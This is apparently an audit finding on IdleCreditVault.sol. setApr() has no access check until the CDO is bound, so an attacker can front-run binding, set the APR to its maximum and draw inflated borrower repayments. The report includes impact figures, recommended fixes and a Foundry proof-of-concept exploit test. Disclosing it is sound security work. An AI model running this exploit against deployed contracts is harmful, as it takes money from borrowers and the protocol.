### Title
Unauthenticated APR modification before CDO binding lets an attacker inflate borrower repayments - ([contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault.setApr()` skips its caller authorization whenever `idleCDO == address(0)`. This creates a setup-order race analogous to writing a sensitive file before assigning restrictive permissions: the vault’s sensitive interest-rate state remains publicly writable until `setWhitelistedCDO()` assigns the CDO that enforces access control.

An unprivileged attacker can front-run the CDO-binding transaction, set the scaled APR to `maxApr`, deposit after the CDO is configured, and receive excess borrower repayment as yield through their tranche position.

### Finding Description
`IdleCreditVault.initialize()` configures `borrower`, `manager`, `maxApr`, `lastApr`, and `unscaledApr`, but does not bind `idleCDO`. [1](#0-0) 

The later `setApr()` authorization check is disabled while `idleCDO` is zero:

```solidity
if (_cdo != address(0)) {
  if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
}
``` [2](#0-1) 

The CDO is only bound later through `setWhitelistedCDO()`. [3](#0-2) 

`startEpoch()` subsequently calculates `expectedEpochInterest` from the attacker-controlled strategy APR. [4](#0-3)  At `stopEpoch()`, the CDO pulls `expectedEpochInterest` plus withdrawal or recalled principal from the borrower. [5](#0-4) 

Because the attack is possible only before CDO binding, it does not require bypassing the normal `msg.sender == idleCDO || msg.sender == manager` check; the check simply does not exist yet.

### Impact Explanation
A KYC-passing attacker can obtain excess vault yield funded by the borrower’s repayment. If the attacker is the sole or dominant tranche holder, substantially all excess interest accrues to them.

For example, with a 30-day epoch, 5-day buffer, intended 10% APR, and `maxApr = 20e18`:

- Intended scaled APR is approximately `11.667e18`.
- Attacker sets scaled APR to `20e18`.
- On `1,000,000` underlying deposited, expected epoch interest rises from approximately `9,589` to `16,438`.
- Excess repayment is approximately `6,849` underlying per epoch.

The loss is borne by the borrower and any protocol-owned recovery or repayment resources used to satisfy the inflated obligation. If the borrower cannot or does not fund the inflated amount, the epoch defaults, crystallizing loss or freezing normal operations.

### Likelihood Explanation
The vulnerability requires the strategy to be initialized and left unbound for at least one attacker transaction. This is realistic when strategy deployment, CDO deployment, and `setWhitelistedCDO()` are separate transactions or when the binding transaction can be front-run.

If deployment and binding are always atomic in a factory transaction, the external race is not exploitable. The code nevertheless exposes a publicly writable privileged parameter during the intermediate state, so correctness depends on deployment ordering rather than contract-enforced permissions.

### Recommendation
Do not leave `idleCDO == address(0)` as an unauthenticated setup state.

Recommended fixes:

1. Pass the CDO to `initialize()` or initialize through a factory that binds it atomically.
2. Revert in `setApr()` and `setAprs*()` when `idleCDO == address(0)`.
3. If setup must occur before binding, introduce a temporary immutable deployer or manager-only setup role rather than allowing unrestricted calls.
4. Reassert or overwrite the APR during `setWhitelistedCDO()` if backward compatibility requires retaining the current initialization order.

### Proof of Concept
The following Foundry-style PoC assumes the existing credit-vault test fixture provides `strategy`, `cdo`, `underlying`, `owner`, `manager`, `borrower`, `AAtranche`, and a configured deployment where `strategy.idleCDO()` is initially unset:

```solidity
function testUnboundStrategyAprInflatesBorrowerRepayment() public {
    address attacker = makeAddr("attacker");
    uint256 depositAmount = 1_000_000 * ONE_SCALE;

    // Strategy was initialized, but its whitelisted CDO has not been assigned.
    assertEq(strategy.idleCDO(), address(0));

    // Any EOA can write the sensitive scaled APR while idleCDO is zero.
    uint256 maliciousApr = strategy.maxApr();
    vm.prank(attacker);
    strategy.setApr(maliciousApr);
    assertEq(strategy.lastApr(), maliciousApr);

    // Honest owner binds the already-compromised strategy.
    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // Attacker is an allowed lender and takes the tranche position.
    deal(address(underlying), attacker, depositAmount);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    // Honest manager starts the epoch. Expected interest uses attacker APR.
    vm.prank(manager);
    cdo.startEpoch();

    uint256 inflatedInterest = cdo.expectedEpochInterest();
    uint256 expectedHonestInterest =
        depositAmount * ((10e18 * (30 days + 5 days) / 30 days) / 100) *
        30 days /
        (365 days * 1e18);

    assertGt(inflatedInterest, expectedHonestInterest);

    // Close the pool and recover principal plus inflated interest.
    uint256 repayment = depositAmount + inflatedInterest;
    deal(address(underlying), borrower, repayment);
    vm.prank(borrower);
    underlying.approve(address(cdo), repayment);

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 1);

    // Closed-pool withdrawals are immediately claimable.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.startPrank(attacker);
    cdo.requestWithdraw(0, AAtranche);
    cdo.claimWithdrawRequest();
    vm.stopPrank();

    assertApproxEqAbs(
        underlying.balanceOf(attacker) - attackerBefore,
        repayment,
        2
    );
}
```
